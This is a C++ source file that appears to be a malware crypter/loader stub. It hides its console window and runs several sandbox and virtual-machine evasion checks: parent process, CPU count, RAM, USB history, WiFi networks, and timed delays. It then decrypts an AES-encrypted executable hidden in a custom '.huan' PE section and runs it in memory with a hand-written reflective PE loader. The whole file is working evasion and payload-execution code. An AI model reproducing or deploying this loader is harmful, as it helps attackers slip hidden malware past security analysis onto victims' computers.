#include <Windows.h>
#include <winnt.h>
#include <iostream>
#include <stdio.h>
#include <TlHelp32.h>
#include <wlanapi.h>
#include <wininet.h>

#pragma comment(lib, "wlanapi.lib")
#pragma comment (lib, "Wininet.lib")

#include "Crypto.h"
#include "ntddk.h"

#define ntHeaders(imageBase) ((IMAGE_NT_HEADERS *)((size_t)imageBase + ((IMAGE_DOS_HEADER *)imageBase)->e_lfanew))
#define sectionHeaderArrays(imageBase) ((IMAGE_SECTION_HEADER *)((size_t)ntHeaders(imageBase) + sizeof(IMAGE_NT_HEADERS)))

typedef struct _BASE_RELOCATION_ENTRY {
	WORD Offset : 12;
	WORD Type : 4;
} BASE_RELOCATION_ENTRY;


IMAGE_DATA_DIRECTORY* getRelocTable(IMAGE_NT_HEADERS* ntHeader) {
	IMAGE_DATA_DIRECTORY* returnTable = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	if (returnTable->VirtualAddress == NULL) {
		return NULL;
	}
	else {
		return returnTable;
	}
}

void fixImportAddressTable(BYTE* baseAddress) {
	std::cout << "[+] IAT Fix starts..." << std::endl;
	IMAGE_NT_HEADERS* ntHeader = ntHeaders(baseAddress);
	IMAGE_DATA_DIRECTORY* iatDirectory = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	if (iatDirectory->VirtualAddress == NULL) {
		std::cout << "[!] Import Table not found" << std::endl;
	}
	else {
		size_t iatSize = iatDirectory->Size;
		size_t iatRVA = iatDirectory->VirtualAddress;
		IMAGE_IMPORT_DESCRIPTOR* ITEntryCursor = NULL;
		size_t parsedSize = 0;
		for (; parsedSize < iatSize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
			ITEntryCursor = (IMAGE_IMPORT_DESCRIPTOR*)(iatRVA + (ULONG_PTR)baseAddress + parsedSize);
			if (ITEntryCursor->OriginalFirstThunk == NULL && ITEntryCursor->FirstThunk == NULL) {
				break;
			}
			LPSTR dllName = (LPSTR)((ULONGLONG)baseAddress + ITEntryCursor->Name);
			std::cout << "[+] Imported DLL Name: " << dllName << std::endl;
			//Address
			size_t firstThunkRVA = ITEntryCursor->FirstThunk;
			//Name
			size_t originalFirstThunkRVA = ITEntryCursor->OriginalFirstThunk;
			if (originalFirstThunkRVA == NULL) {
				originalFirstThunkRVA = ITEntryCursor->FirstThunk;
			}
			size_t cursorFirstThunk = 0;
			size_t cursorOriginalFirstThunk = 0;
			while (true) {
				IMAGE_THUNK_DATA* firstThunkData = (IMAGE_THUNK_DATA*)(baseAddress + cursorFirstThunk + firstThunkRVA);
				IMAGE_THUNK_DATA* originalFirstThunkData = (IMAGE_THUNK_DATA*)(baseAddress + cursorOriginalFirstThunk + originalFirstThunkRVA);
				if (firstThunkData->u1.Function == NULL) {
					//end of the list
					break;
				}
				else if (IMAGE_SNAP_BY_ORDINAL64(originalFirstThunkData->u1.Ordinal)) {
					unsigned int printOrdinal = originalFirstThunkData->u1.Ordinal & 0xFFFF;
					size_t functionAddr = (size_t)GetProcAddress(LoadLibraryA(dllName), (char*)(originalFirstThunkData->u1.Ordinal & 0xFFFF));
					std::cout << "     [+] Import by ordinal: " << printOrdinal << std::endl;
					firstThunkData->u1.Function = (ULONGLONG)functionAddr;
				}
				else {
					PIMAGE_IMPORT_BY_NAME nameOfFunc = (PIMAGE_IMPORT_BY_NAME)(size_t(baseAddress) + originalFirstThunkData->u1.AddressOfData);
					size_t functionAddr = (size_t)GetProcAddress(LoadLibraryA(dllName), nameOfFunc->Name);
					std::cout << "     [+] Import by name: " << nameOfFunc->Name << std::endl;
					firstThunkData->u1.Function = (ULONGLONG)functionAddr;
				}
				cursorFirstThunk += sizeof(IMAGE_THUNK_DATA);
				cursorOriginalFirstThunk += sizeof(IMAGE_THUNK_DATA);
			}
		}
	}
}


void fixRelocTable(BYTE* loadedAddr, BYTE* preferableAddr, IMAGE_DATA_DIRECTORY* relocDir) {
	size_t maxSizeOfDir = relocDir->Size;
	size_t relocBlocks = relocDir->VirtualAddress;
	IMAGE_BASE_RELOCATION* relocBlockMetadata = NULL;

	size_t relocBlockOffset = 0;
	for (; relocBlockOffset < maxSizeOfDir; relocBlockOffset += relocBlockMetadata->SizeOfBlock) {
		relocBlockMetadata = (IMAGE_BASE_RELOCATION*)(relocBlocks + relocBlockOffset + loadedAddr);
		if (relocBlockMetadata->VirtualAddress == NULL || relocBlockMetadata->SizeOfBlock == 0) {
			//No more block
			break;
		}
		size_t entriesNum = (relocBlockMetadata->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
		size_t pageStart = relocBlockMetadata->VirtualAddress;
		//printf("Entries Num: %d %d\n", entriesNum, pageStart);
		BASE_RELOCATION_ENTRY* relocEntryCursor = (BASE_RELOCATION_ENTRY*)((BYTE*)relocBlockMetadata + sizeof(IMAGE_BASE_RELOCATION));
		for (int i = 0; i < entriesNum; i++) {
			if (relocEntryCursor->Type == 0) {
				continue;
			}
			DWORD* relocationAddr = (DWORD*)(pageStart + loadedAddr + relocEntryCursor->Offset);
			*relocationAddr = *relocationAddr + loadedAddr - preferableAddr;
			relocEntryCursor = (BASE_RELOCATION_ENTRY*)((BYTE*)relocEntryCursor + sizeof(BASE_RELOCATION_ENTRY));
		}
	}
	if (relocBlockOffset == 0) {
		//Nothing happened
		std::cout << "[!] There is a problem in relocation directory" << std::endl;
	}
}

void peLoader(unsigned char* baseAddr) {
	IMAGE_NT_HEADERS* ntHeader = ntHeaders(baseAddr);
	IMAGE_DATA_DIRECTORY* relocTable = getRelocTable(ntHeader);
	ULONGLONG preferableAddress = ntHeader->OptionalHeader.ImageBase;
	HMODULE ntdllHandler = LoadLibraryA("ntdll.dll");
	//Unmap the preferable address
	((int(WINAPI*)(HANDLE, PVOID))GetProcAddress(ntdllHandler, "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);
	BYTE* imageBaseForPE = (BYTE*)VirtualAlloc((LPVOID)preferableAddress, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!imageBaseForPE && !relocTable) {
		std::cout << "[!] No Relocation Table and Cannot load to the preferable address" << std::endl;
		return;
	}
	if (!imageBaseForPE && relocTable) {
		std::cout << "[+] Cannot load to the preferable address" << std::endl;
		imageBaseForPE = (BYTE*)VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (!imageBaseForPE) {
			std::cout << "[!] Cannot allocate the memory" << std::endl;
			return;
		}
	}
	ntHeader->OptionalHeader.ImageBase = (ULONGLONG)imageBaseForPE;
	// SizeOfHeaders indicates how much space in the file is used for representing all the file headers, including the MS - DOS header, PE file header, PE optional header, and PE section headers.The section bodies begin at this location in the file.
	memcpy(imageBaseForPE, baseAddr, ntHeader->OptionalHeader.SizeOfHeaders);
	std::cout << "[+] All headers are copied" << std::endl;
	IMAGE_SECTION_HEADER* sectionHeaderCursor = (IMAGE_SECTION_HEADER*)(size_t(ntHeader) + sizeof(IMAGE_NT_HEADERS));
	for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
		memcpy(imageBaseForPE + sectionHeaderCursor[i].VirtualAddress, baseAddr + sectionHeaderCursor[i].PointerToRawData, sectionHeaderCursor[i].SizeOfRawData);
	}
	std::cout << "[+] All sections are copied" << std::endl;
	fixImportAddressTable(imageBaseForPE);
	if (((ULONGLONG)imageBaseForPE) != preferableAddress) {
		if (relocTable) {
			fixRelocTable(imageBaseForPE, (BYTE*)preferableAddress, relocTable);
		}
		else {
			std::cout << "[!] No Reloc Table Found" << std::endl;
		}

	}
	size_t startAddress = (size_t)(imageBaseForPE)+ntHeader->OptionalHeader.AddressOfEntryPoint;
	std::cout << "[+] Binary is running" << std::endl;

	((void(*)())startAddress)();
}









//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


DWORD GET_TARG_PROC(char* TargetProc) {
	ULONG retLen = 0;
	NtQuerySystemInformation(SystemProcessInformation, 0, 0, &retLen);
	if (retLen == 0) {
		return false;
	}
	const size_t bufLen = retLen;
	void* infoBuf = malloc(bufLen);
	if (!infoBuf) {
		return false;
	}
	memset(infoBuf, 0, bufLen);
	SYSTEM_PROCESS_INFORMATION* sys_info = (SYSTEM_PROCESS_INFORMATION*)infoBuf;
	if (NtQuerySystemInformation(SystemProcessInformation, sys_info, bufLen, &retLen) == STATUS_SUCCESS) {
		while (true) {
			char Process[70];
			int pid = (int)sys_info->UniqueProcessId;
			if (sys_info->ImageName.Buffer) {
				wcstombs(Process, sys_info->ImageName.Buffer, 70);
				if (strcmp(TargetProc, Process) == 0) {
					return pid;
				}
			}
			if (!sys_info->NextEntryOffset) {
				break;
			}
			sys_info = (SYSTEM_PROCESS_INFORMATION*)((ULONG_PTR)sys_info + sys_info->NextEntryOffset);
		}
	}
	free(infoBuf);
	return -1;
}


DWORD GetParentPID(DWORD pid)
{
	DWORD ppid = 0;
	PROCESSENTRY32W processEntry = { 0 };
	processEntry.dwSize = sizeof(PROCESSENTRY32W);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (Process32FirstW(hSnapshot, &processEntry))
	{
		do
		{
			if (processEntry.th32ProcessID == pid) {
				ppid = processEntry.th32ParentProcessID;
				break;
			}
		} while (Process32NextW(hSnapshot, &processEntry));
	}
	CloseHandle(hSnapshot);
	printf("[+] parent pid : %d \n", ppid);
	return ppid;
}

int find_Explorer() {
	char* processName = (char*)"explorer.exe";
	DWORD processID = GET_TARG_PROC(processName);
	return processID;
}

int detect_parent() {
	DWORD parentPid = GetParentPID(GetCurrentProcessId());
	printf("[+] Targetting Pid : %d \n", GetCurrentProcessId());
	printf("[+] Explorer.exe pid is %d \n", find_Explorer());
	if (find_Explorer() != parentPid) {
		printf("[!] DANGEROUS ===> Explorer.exe is [NOT] our PPID ...\n");
		return -1;
	}
	else if (find_Explorer() == parentPid) {
		printf("[+] NORMAL ===> Explorer.exe is our PPID... \n");
		return 1;
	}
	else {
		printf("[!] DANGEROUS ===> Something unusual happend ...\n");
		return -1;
	}
}

bool Check_Hardware() {

	//cpu core check
	SYSTEM_INFO systemInfo;
	GetSystemInfo(&systemInfo);
	DWORD Processors = systemInfo.dwNumberOfProcessors;
	if (Processors < 3) {
		printf("[-] Processors less than 3, Possibly a Sandbox / VM \n");
		return false;
	}

	//ram check 
	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	GlobalMemoryStatusEx(&memoryStatus);
	DWORD RAM = memoryStatus.ullTotalPhys / 1024 / 1024;
	if (RAM < 2048) {
		printf("[-]  RAM less than 2048 MB, Possibly a Sandbox / VM \n");
		return false;
	}

	//hdd check ...
	/*
	HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	DISK_GEOMETRY pDiskGeometry;
	DWORD bytesReturned;
	DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
	DWORD disk = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
	if (disk < 100) {
		printf("[-] Disk storage less than 100 GB, Possibly a Sandbox / VM \n");
		return false;
	}*/

	//usb check:
	HKEY hKey;
	DWORD USB;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Enum\\USBSTOR", 0, KEY_READ, &hKey);
	RegQueryInfoKey(hKey, NULL, NULL, NULL, &USB, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	if (USB < 2) {
		printf("[-] Less than 2 usb where plugged to this system, Possibly a Sandbox / VM \n");
		return false;
	}
}

//this functiuon can be helpfull in sandboxes, to sleep in them 
int Delay_Exec(int number) {
	printf("[+] Running Delay Execution for %d ... \n", number);
	ULONGLONG uptimeBeforeSleep = GetTickCount64();
	typedef NTSTATUS(WINAPI* PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
	PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDelayExecution");
	LARGE_INTEGER delay;
	delay.QuadPart = -10000 * number;
	pNtDelayExecution(FALSE, &delay);
	ULONGLONG uptimeAfterSleep = GetTickCount64();
	if ((uptimeAfterSleep - uptimeBeforeSleep) < number) {
		printf("[-] Delay Execution Failed ! \n");
		return -1;
	}
	else {
		printf("[+] DONE ! \n");
	}
}


VOID WlanNotification(WLAN_NOTIFICATION_DATA* wlanNotifData, VOID* p)
{
	if (wlanNotifData->NotificationCode == wlan_notification_acm_scan_complete)
	{
		bool bWait = false;
	}
	else if (wlanNotifData->NotificationCode == wlan_notification_acm_scan_fail)
	{
		bool bWait = false;
	}
}


bool DETECT_WIFI() {

	HANDLE hWlan = NULL;

	DWORD dwError = 0;
	DWORD dwSupportedVersion = 0;
	DWORD dwClientVersion = (TRUE ? 2 : 1);

	GUID guidInterface; ZeroMemory(&guidInterface, sizeof(GUID));

	WLAN_INTERFACE_INFO_LIST* wlanInterfaceList = (WLAN_INTERFACE_INFO_LIST*)WlanAllocateMemory(sizeof(WLAN_INTERFACE_INFO_LIST));
	ZeroMemory(wlanInterfaceList, sizeof(WLAN_INTERFACE_INFO_LIST));

	WLAN_AVAILABLE_NETWORK_LIST* wlanNetworkList = (WLAN_AVAILABLE_NETWORK_LIST*)WlanAllocateMemory(sizeof(WLAN_AVAILABLE_NETWORK_LIST));
	ZeroMemory(wlanNetworkList, sizeof(WLAN_AVAILABLE_NETWORK_LIST));

	int xxx = 0;

	try
	{
		if (dwError = WlanOpenHandle(dwClientVersion, NULL, &dwSupportedVersion, &hWlan) != ERROR_SUCCESS)
			return FALSE;

		if (dwError = WlanEnumInterfaces(hWlan, NULL, &wlanInterfaceList) != ERROR_SUCCESS)
			return FALSE;

		if (dwError = wlanInterfaceList->InterfaceInfo[0].isState != wlan_interface_state_not_ready)
		{
			if (wlanInterfaceList->dwNumberOfItems > 1)
			{
				guidInterface = wlanInterfaceList->InterfaceInfo[0].InterfaceGuid;
			}
			else
			{
				guidInterface = wlanInterfaceList->InterfaceInfo[0].InterfaceGuid;
			}
		}
		else
			return FALSE;

		DWORD dwPrevNotif = 0;
		bool bWait = true;


		if (dwError = WlanRegisterNotification(hWlan, WLAN_NOTIFICATION_SOURCE_ACM, TRUE,
			(WLAN_NOTIFICATION_CALLBACK)WlanNotification, NULL, NULL, &dwPrevNotif) != ERROR_SUCCESS)
			return FALSE;

		if (dwError = WlanScan(hWlan, &guidInterface, NULL, NULL, NULL) != ERROR_SUCCESS)
			return FALSE;


		WlanRegisterNotification(hWlan, WLAN_NOTIFICATION_SOURCE_NONE, TRUE, NULL, NULL, NULL, &dwPrevNotif);

		if (dwError = WlanGetAvailableNetworkList(hWlan, &guidInterface, NULL, NULL, &wlanNetworkList) != ERROR_SUCCESS)
			return FALSE;

		for (unsigned int i = 0; i < wlanNetworkList->dwNumberOfItems; i++)
		{
			xxx++;
		}
	}
	catch (char* szError)
	{
		printf("[!] Sandbox detected\n");
		return FALSE;
	}

	if (wlanNetworkList)
		WlanFreeMemory(wlanNetworkList);
	if (wlanInterfaceList)
		WlanFreeMemory(wlanInterfaceList);
	if (hWlan)
		WlanCloseHandle(hWlan, NULL);

	if (xxx > 0)
		return TRUE;

}


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

int main() {
	//hide

	ShowWindow(GetConsoleWindow(), SW_HIDE);
	//check 
	if (detect_parent() < 0) {
		printf("\t\t[!] [!] [!] DANGER [!] [!] [!] \n");
		return -1;
	}

	Delay_Exec(10000);

	if (Check_Hardware() == false) {
		printf("\t\t[!] [!] [!] DANGER [!] [!] [!] \n");
		return -1;
	}

	Delay_Exec(10000);

	if (DETECT_WIFI() == false) {
		printf("\t\t[!] [!] [!] DANGER [!] [!] [!] \n");
		return -1;
	}

	Delay_Exec(10000);



	//Get image base address from struct offsets of PEB and TEB
	size_t fileSizeForDebug;
	unsigned char encryptKey[16];
	unsigned char IVKey[16];
	int* originalDataLength;
	int* encryptedDataLength;
	unsigned char* encryptedContent;
	unsigned char* originalContent;
	char* TEBPtr = (char*)__readgsqword(0x30);
	char* PEBPtr = *((char**)(TEBPtr + 0x060));
	char* imageBaseAddress = *(char**)(PEBPtr + 0x10);
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBaseAddress;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)(imageBaseAddress + dosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER sectionHeadersCursor = (PIMAGE_SECTION_HEADER)(((PBYTE)imageNTHeaders) + sizeof(IMAGE_NT_HEADERS));
	BYTE buf[10];
	for (unsigned int i = 1; i <= imageNTHeaders->FileHeader.NumberOfSections; i++) {
		if (strncmp((const char*)sectionHeadersCursor->Name, ".huan", 5) == 0) {
			break;
		}
		sectionHeadersCursor = (PIMAGE_SECTION_HEADER)((PBYTE)sectionHeadersCursor + 0x28);
	}

	char* sectionValuePtr = imageBaseAddress + sectionHeadersCursor->VirtualAddress;
	//New Section contains 4 byte original length + 4 byte encrypted length + 16 byte Key + 16 byte IV + encrypted data
	originalDataLength = (int*)sectionValuePtr;
	encryptedDataLength = (int*)(sectionValuePtr + 4);
	memcpy(encryptKey, sectionValuePtr + 8, 16);
	memcpy(IVKey, sectionValuePtr + 24, 16);
	encryptedContent = (unsigned char*)malloc(*encryptedDataLength);
	originalContent = (unsigned char*)malloc(*originalDataLength);
	memcpy(encryptedContent, sectionValuePtr + 40, *encryptedDataLength);
	decryptData(encryptedContent, *encryptedDataLength, encryptKey, IVKey);
	memcpy(originalContent, encryptedContent, *originalDataLength);
	std::cout << "[+] Data is decrypted! " << std::endl;
	peLoader(originalContent);
	//Size of raw image shows the required address space (Last section Virtual Address + Last section virtual size
	return 0;
}